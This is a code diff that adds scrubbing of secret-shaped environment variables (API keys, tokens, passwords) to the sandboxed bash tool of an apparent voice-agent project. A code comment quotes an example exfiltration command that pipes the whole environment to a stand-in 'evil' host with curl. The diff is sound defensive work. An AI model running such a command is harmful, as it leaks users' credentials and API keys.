@@ -137,6 +137,33 @@ def _check_refuse(command: str) -> Optional[str]:
 _BWRAP_AVAILABLE = os.path.exists("/usr/bin/bwrap")
 _BWRAP_ENABLED = os.environ.get("JARVIS_BASH_BWRAP", "1") == "1" and _BWRAP_AVAILABLE
 
+# ── Env-secret scrubbing (added 2026-05-20) ──────────────────────────
+# The voice-agent process env carries every LLM/cloud API key + the
+# LiveKit secret + the bridge token (loaded via the systemd
+# EnvironmentFiles). bwrap masks secret *files* (~/.ssh, ~/.aws, …) but
+# NOT env vars, so a `network=True` command could exfil them with
+# `curl evil -d "$(env)"`. We strip secret-shaped vars from every bash
+# subprocess's environment (both bwrap and non-bwrap paths). Default on;
+# set JARVIS_BASH_SCRUB_ENV=0 to pass the full env (debug, or a command
+# that genuinely needs a key — rare for shell work).
+_SCRUB_ENV = os.environ.get("JARVIS_BASH_SCRUB_ENV", "1") == "1"
+_SECRET_ENV_RE = re.compile(
+    r"(?:API_KEY|API_SECRET|ACCESS_KEY|SECRET_KEY|AUTH_TOKEN|_SECRET$|_TOKEN$"
+    r"|PASSWORD|CREDENTIAL)"
+    r"|^(?:GROQ|OPENAI|ANTHROPIC|DEEPSEEK|GEMINI|GOOGLE_API|ELEVENLABS|LANGCHAIN"
+    r"|LANGSMITH|HUGGINGFACE|HF|KIMI|MOONSHOT|OPENROUTER|LIVEKIT|JARVIS_LOCAL)_",
+    re.I,
+)
+
+
+def _scrub_env() -> Optional[dict]:
+    """Env for the bash subprocess: os.environ minus secret-shaped vars.
+    Returns None when scrubbing is disabled, so the subprocess inherits
+    the full env (the pre-scrub behaviour)."""
+    if not _SCRUB_ENV:
+        return None
+    return {k: v for k, v in os.environ.items() if not _SECRET_ENV_RE.search(k)}
+
 
 def _bwrap_argv(
     inner_cmd: str,
@@ -385,9 +412,11 @@ async def bash(
     2026-05-17). Network is UNSHARED — pass `network=True` for any
     command that legitimately needs network access (npm install,
     git pull, curl, apt update, pip install, …). ~/.ssh, ~/.aws,
-    ~/.gnupg, ~/.config/gh are tmpfs-masked regardless so secrets
-    can't leak through a misrouted command. Disable the sandbox
-    globally with `JARVIS_BASH_BWRAP=0` (test/debug only).
+    ~/.gnupg, ~/.config/gh are tmpfs-masked regardless, AND secret-shaped
+    env vars (API keys, LiveKit secret, bridge token) are stripped from
+    the command's environment, so secrets can't leak through a misrouted
+    command. Disable the sandbox globally with `JARVIS_BASH_BWRAP=0`, or
+    keep the full env with `JARVIS_BASH_SCRUB_ENV=0` (test/debug only).
 
     Instructions:
       - If the command will create new directories or files, first run
@@ -513,6 +542,7 @@ async def bash(
                 stderr=asyncio.subprocess.DEVNULL,
                 start_new_session=True,
                 cwd=sp_cwd,
+                env=_scrub_env(),
             )
             return f"Started in background: {description or cmd[:60]}."
         except Exception as e:
@@ -535,6 +565,7 @@ async def bash(
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
             cwd=sp_cwd,
+            env=_scrub_env(),
         )
         try:
             stdout_b, stderr_b = await asyncio.wait_for(
